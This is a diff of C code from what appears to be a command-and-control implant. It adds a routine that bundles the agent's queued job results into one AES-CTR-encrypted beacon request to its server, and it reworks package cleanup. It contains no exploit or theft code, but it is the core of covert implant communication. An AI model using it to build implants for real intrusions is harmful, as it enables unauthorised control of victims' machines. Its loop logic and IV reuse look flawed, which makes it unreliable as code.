@@ -265,21 +265,23 @@ INT DestroyPackage(pPackage pack, pAgent agent) {
 	while (pkg)
 	{
 		if (pack == pkg) {
-			return PACKAGE_HAS_NOT_BEEN_SENT_TO_SERVER;
+			//TODO write this. and destory if package has been sent and is still apart of the agent packages list. May need to make a Doubly linked list to keep the list intact if a pacakge that is destoryed is in the middle of the list.
+			return PACKAGE_HAS_NOT_BEEN_SENT_TO_SERVER; //do not destroy if it's in our list of packages to send.
 		}
 		pkg = pkg->Next;
 	}
 
-	if (!pack->Buffer)
-		return PACKAGE_BUFFER_DOES_NOT_EXIST;
+	if (pack->Buffer)
+	{
+		MemorySet(pack->Buffer, 0, pack->Length);
+		LocalFree(pack->Buffer);
+		pack->Buffer = NULL;
+	}
 
-	MemorySet(pack->Buffer, 0, pack->Length);
-	LocalFree(pack->Buffer);
-	pack->Buffer = NULL;
 
-	MemorySet(pack->Buffer, 0, pack->Length);
-	LocalFree(pack->Buffer);
-	pack->Buffer = NULL;
+	MemorySet(pack, 0, sizeof(Package));
+	LocalFree(pack);
+	pack = NULL;
 
 	return PACKAGE_SUCCESS;
 }
@@ -348,6 +350,115 @@ INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize, pA
 	return PACKAGE_SUCCESS;
 } 
 
+BOOL PackageSendAll(pAgent agent, OUT pDataBuffer Response, OUT PSIZE_T Size)
+{
+	BOOL Success = FALSE;
+	pPackage pack = NULL;
+	pPackage AgentPackList = agent->packages;
+	pPackage PrevPackage = NULL;
+	pPackage CurrentPackage = NULL;
+	UINT32 Offset = 0;
+
+	pack = CreatePackageWithMetaData(GET_AGENT_JOB, agent);
+	//coalesce all waiting packages into one big pacakge.
+	while (AgentPackList)
+	{
+		PackageAddInt32(pack, AgentPackList->CommandID);
+		PackageAddInt32(pack, AgentPackList->RequestID);
+		AddBytesToPackage(pack, AgentPackList->Buffer, AgentPackList->Length);
+		AgentPackList->Sent = TRUE;
+		PrevPackage = AgentPackList;
+		AgentPackList = AgentPackList->Next;
+	}
+	AddInt32ToBuffer(pack->Buffer, pack->Length - sizeof(UINT32));
+	/*
+ *  Header:
+ *  [ SIZE         ] 4 bytes
+ *  [ Magic Value  ] 4 bytes
+ *  [ Agent ID     ] 4 bytes
+ *  [ COMMAND ID   ] 4 bytes
+ *  [ Request ID   ] 4 bytes
+ *  [ Agent Name   ] size + bytes
+*/
+	Offset = (sizeof(UINT32) * 6) + StringLengthA(agent->config->AgentName);
+	//encrypt the big package.
+	AESCTR((BYTE*)pack->Buffer + Offset, pack->Length - Offset, agent->AESKey, agent->AESKeySize, agent->IV);
+	//send the big package.
+	if ((PerformRequest(agent, pack->Buffer, pack->Length, Response, Size)) == 0)
+	{
+		Success = TRUE;
+	}
+	else {
+		Success = FALSE;
+	}
+	//decrypt the payload.
+	AESCTR((BYTE*)pack->Buffer + Offset, pack->Length - Offset, agent->AESKey, agent->AESKeySize, agent->IV);
+
+	CurrentPackage = agent->packages;
+	PrevPackage = NULL;
+
+	if (Success)
+	{
+		//sending of all the packages worked. Now we can destroy them.
+		while (CurrentPackage)
+		{
+			if (CurrentPackage->Sent)
+			{
+				//is this the first pacakge in our list.
+				if (CurrentPackage == agent->packages)
+				{
+					//update our package list to the next pacakge.
+					agent->packages = CurrentPackage->Next; // the reeason why our destroy function will work is because we move the pointer to the next package in the list. Thereefore removing the previous package from the list.
+															// this will ensure we pass the check for "if this is still in list do not destroy in our package destroy function"
+					//destroy if instructed to do so.
+					if (CurrentPackage->Destroy)
+					{
+						DestroyPackage(CurrentPackage, agent);
+						CurrentPackage = NULL;
+					}
+					CurrentPackage = agent->packages;
+					PrevPackage = NULL;
+				}
+				else
+				{
+					if (PrevPackage)
+					{
+						PrevPackage->Next = CurrentPackage->Next;
+						if (CurrentPackage->Destroy)
+						{
+							DestroyPackage(CurrentPackage, agent);
+						}
+						CurrentPackage = PrevPackage->Next;
+					}
+					else
+					{
+						printf("[error] attempting to clean up packages\n");
+						continue;
+					}
+				}
+			}
+			else
+			{
+				PrevPackage = CurrentPackage;
+				CurrentPackage = CurrentPackage->Next;
+			}
+		}
+	}
+	else //request to send all packages failed.
+	{
+		//make all packages as unsent.
+		while (CurrentPackage)
+		{
+			CurrentPackage->Sent = FALSE;
+			CurrentPackage = CurrentPackage->Next;
+		}
+	}
+
+	DestroyPackage(pack, agent);
+
+	return Success;
+}
+
 void AddPackageToAgentPackageList(pAgent agent, pPackage pack) {
 	if (agent->packages == NULL)
 	{
@@ -363,3 +474,4 @@ void AddPackageToAgentPackageList(pAgent agent, pPackage pack) {
 		temp->Next = pack;
 	}
 }
+
